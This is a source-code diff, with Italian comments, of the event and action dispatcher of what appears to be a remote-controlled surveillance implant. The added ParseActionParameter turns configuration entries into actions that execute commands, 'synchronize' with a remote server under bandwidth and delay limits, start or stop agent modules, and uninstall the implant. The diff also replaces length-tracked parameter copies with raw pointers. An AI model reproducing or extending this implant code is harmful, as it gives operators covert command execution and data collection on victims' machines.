@@ -11,7 +11,6 @@
 #include "JSON\JSON.h"
 #include "SM_EventHandlers.h"
 
-
 // Il sistema si basa su condizioni->eventi->azioni
 // Un event monitor, quando si verifica una condizione, genera un evento. Le condizioni sono verificate a discrezione
 // dell'event monitor (EM)stesso in base al Param passato alla funzione pEventMonitorAdd. 
@@ -26,12 +25,14 @@
 typedef void (WINAPI *EventMonitorAdd_t) (JSONObject, event_param_struct *, DWORD);
 typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
-typedef BOOL (WINAPI *ActionFunc_t) (BYTE *, DWORD);
+typedef BOOL (WINAPI *ActionFunc_t) (BYTE *);
 
 ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 
-typedef void (WINAPI *conf_callback_t)(JSONObject);
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
+extern BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count);
+extern DWORD AM_GetAgentTag(const WCHAR *agent_name);
 
 // Gestione event monitor  ----------------------------------------------
 
@@ -61,7 +62,6 @@ typedef struct {
 // Tabella degli event monitor attualmente registrati
 DWORD event_monitor_count = 0;
 event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];
-DWORD g_event_id = 0; // contatore dell'evento attulamente in inserzione
 
 // Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
 event_table_struct *event_table = NULL;
@@ -145,7 +145,6 @@ void EventMonitorStopAll()
 
 void EventTableInit()
 {
-	g_event_id = 0;
 	SAFE_FREE(event_table);
 	event_count = 0;
 }
@@ -200,7 +199,6 @@ BOOL EventIsEnabled(DWORD event_id)
 typedef struct {
 	ActionFunc_t pActionFunc; // Puntatore alla funzione che effettua l'action
 	BYTE *param;              // Puntatore all'array contenente i parametri
-	DWORD param_len;
 } action_elem;
 
 typedef struct {
@@ -278,16 +276,16 @@ void DispatchEvent(DWORD event_id)
 	// sottoazioni che potrebbero non esistere piu'
 	for (i=0; i<event_action_array[event_id].subaction_count; i++) {
 		if (event_action_array[event_id].subaction_list[i].pActionFunc) {
-			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param, event_action_array[event_id].subaction_list[i].param_len))
+			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param))
 				break;
 		}
 	}
 }
 
 
-// Aggiunge una sotto-azione per l'evento "event_number" 
+// Aggiunge una sotto-azione per l'azione "event_number" 
 // Torna FALSE solo se ha inserito con successo una azione slow
-BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param, DWORD param_len)
+BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param)
 {
 	void *temp_action_list;
 	BOOL is_fast_action;
@@ -311,18 +309,7 @@ BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 	event_action_array[event_number].subaction_list = (action_elem *)temp_action_list;
 	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
 
-	if (param_len) 
-		event_action_array[event_number].subaction_list[subaction_count].param = (BYTE *)malloc(param_len);
-	else
-		event_action_array[event_number].subaction_list[subaction_count].param = NULL;
-
-	// Effettua la copia solo se il parametro ha lunghezza > 0 ed e' stato allocato correttamente.
-	// altrimenti setta a 0 la lunghezza.
-	if (event_action_array[event_number].subaction_list[subaction_count].param) {
-		memcpy(event_action_array[event_number].subaction_list[subaction_count].param, param, param_len);
-		event_action_array[event_number].subaction_list[subaction_count].param_len = param_len;
-	} else
-		event_action_array[event_number].subaction_list[subaction_count].param_len = 0;
+	event_action_array[event_number].subaction_list[subaction_count].param = param;
 
 	return is_fast_action;
 }
@@ -402,6 +389,8 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 {
 	DWORD i;
 
+	if (is_fast_action)
+		*is_fast_action = TRUE;
 	for (i=0; i<dispatch_func_count; i++)
 		if (dispatch_func_array[i].action_type == action_type) {
 			if (is_fast_action)
@@ -413,67 +402,145 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 }
 
 //-----------------------------------------------------------------------------------
-void WINAPI ParseEvents(JSONObject conf_json)
+void WINAPI ParseEvents(JSONObject conf_json, DWORD counter)
 {
 	event_param_struct event_param;
 
-	if (conf_json[L"start"]->IsNumber())
+	if (conf_json[L"start"])
 		event_param.start_action = conf_json[L"start"]->AsNumber();
 	else
 		event_param.start_action = AF_NONE;
 
-	if (conf_json[L"stop"]->IsNumber())
+	if (conf_json[L"stop"])
 		event_param.stop_action = conf_json[L"stop"]->AsNumber();
 	else
 		event_param.stop_action = AF_NONE;
 
-	if (conf_json[L"repeat"]->IsNumber())
+	if (conf_json[L"repeat"])
 		event_param.repeat_action = conf_json[L"repeat"]->AsNumber();
 	else
 		event_param.repeat_action = AF_NONE;
 
-	if (conf_json[L"iter"]->IsNumber())
+	if (conf_json[L"iter"])
 		event_param.count = conf_json[L"iter"]->AsNumber();
 	else
 		event_param.count = 0;
 
-	if (conf_json[L"delay"]->IsNumber())
+	if (conf_json[L"delay"])
 		event_param.delay = conf_json[L"delay"]->AsNumber();
 	else
 		event_param.delay = 0;
 
-	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, g_event_id++, conf_json[L"enabled"]->AsBool());
+	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, counter, conf_json[L"enabled"]->AsBool());
+}
+
+BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
+{
+	WCHAR action[64];
+	BYTE *param = NULL;
+	
+	if (tag)
+		*tag = AF_NONE;
+
+	_snwprintf_s(action, 64, _TRUNCATE, L"%s", conf_json[L"action"]->AsString().c_str());		
+
+	if (!wcscmp(action, L"log")) {
+		*tag = AF_LOGINFO;
+		param = (BYTE *)wcsdup(conf_json[L"text"]->AsString().c_str());
+
+	} else if (!wcscmp(action, L"synchronize")) {
+		typedef struct {
+			DWORD min_sleep;
+			DWORD max_sleep;
+			DWORD band_limit;
+			BOOL  exit_after_completion;
+			char asp_server[1];
+		} sync_conf_struct;
+		sync_conf_struct *sync_conf;
+		*tag = AF_SYNCRONIZE;
+		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str()));
+		if (param) {
+			sync_conf = (sync_conf_struct *)param;
+			sync_conf->min_sleep = conf_json[L"mindelay"]->AsNumber();
+			sync_conf->max_sleep = conf_json[L"maxdelay"]->AsNumber();
+			sync_conf->band_limit= conf_json[L"bandwidth"]->AsNumber();
+			sync_conf->exit_after_completion = conf_json[L"stop"]->AsBool();
+			sprintf_s(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
+		}
+
+	} else if (!wcscmp(action, L"execute")) {
+		*tag = AF_EXECUTE;
+		param = (BYTE *)wcsdup(conf_json[L"command"]->AsString().c_str());
+
+	} else if (!wcscmp(action, L"uninstall")) {
+		*tag = AF_UNINSTALL;
+
+	} else if (!wcscmp(action, L"module")) {
+		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"start"))
+			*tag = AF_STARTAGENT;
+		else
+			*tag = AF_STOPAGENT;
+		param = (BYTE *)malloc(sizeof(DWORD));
+		if (param) {
+			DWORD agent_tag = AM_GetAgentTag(conf_json[L"module"]->AsString().c_str());
+			memcpy(param, &agent_tag, sizeof(DWORD));
+		}
+
+	} else if (!wcscmp(action, L"event")) {
+		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"enabled"))
+			*tag = AF_STARTEVENT;
+		else
+			*tag = AF_STOPEVENT;
+		param = (BYTE *)malloc(sizeof(DWORD));
+		if (param) {
+			DWORD event_id = conf_json[L"event"]->AsNumber();
+			memcpy(param, &event_id, sizeof(DWORD));
+		}
+	}
+
+	return param;
+}
+
+void WINAPI ParseActions(JSONObject conf_json, DWORD counter)
+{
+	JSONArray subaction_array;
+	DWORD i;
+	DWORD tag;
+	BYTE *conf_ptr;
+
+	if (!conf_json[L"subactions"])
+		return;
+	subaction_array = conf_json[L"subactions"]->AsArray();
+
+	for (i=0; i<subaction_array.size(); i++) {
+		JSONObject subaction = subaction_array[i]->AsObject();
+		conf_ptr = ParseActionParameter(subaction, &tag);
+		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
+		// Basta una subaction slow per marcare tutto l'action
+		if (!ActionTableAddSubAction(counter, tag, conf_ptr)) 
+			event_action_array[counter].is_fast_action = FALSE;
+	}
 }
 
 // Istruisce gli EM per il monitor degli eventi e popola l'action table sulla base 
 // del file di configurazione
 void UpdateEventConf()
 {
+	DWORD action_count;
 	char *conf_memory;
 	if (!(conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE)))
 		return;
 
+	// Legge gli eventi
 	EventTableInit();
 	HM_ParseConfSection(conf_memory, L"events", &ParseEvents);
-	
-	//ActionTableInit(action_count);
-	//HM_ParseConfSection(conf_memory, L"actions", &ParseActions);
+
+	// Legge le azioni
+	HM_CountConfSection(conf_memory, L"actions", &action_count);
+	ActionTableInit(action_count);
+	HM_ParseConfSection(conf_memory, L"actions", &ParseActions);
 
 	SAFE_FREE(conf_memory);
-
-	/* 	// ---- Azioni ----
-		for (index=0; index<action_count; index++) {
-			READ_DWORD(subaction_count, conf_ptr);
-			for (;subaction_count>0; subaction_count--) {
-				READ_DWORD(tag, conf_ptr);
-				READ_DWORD(param_len, conf_ptr);
-				// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
-				// Basta una subaction slow per marcare tutto l'action
-				if (!ActionTableAddSubAction(index, tag, conf_ptr, param_len)) 
-					event_action_array[index].is_fast_action = FALSE;
-				conf_ptr += param_len;
-			}
-		}*/
 }
 
 
